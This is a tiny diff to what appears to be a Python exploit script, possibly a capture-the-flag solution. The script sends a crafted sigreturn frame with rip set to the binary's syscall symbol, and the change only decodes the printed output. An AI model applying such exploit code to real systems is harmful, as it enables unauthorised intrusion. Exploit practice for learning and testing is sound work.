@@ -76,7 +76,7 @@ def exploit():
     rip=elf.sym['syscall'],
 )
     r.send(bytes(frame))
-    print(r.readall())
+    print(r.readall().decode())
 
 if __name__ == "__main__":
     exploit()
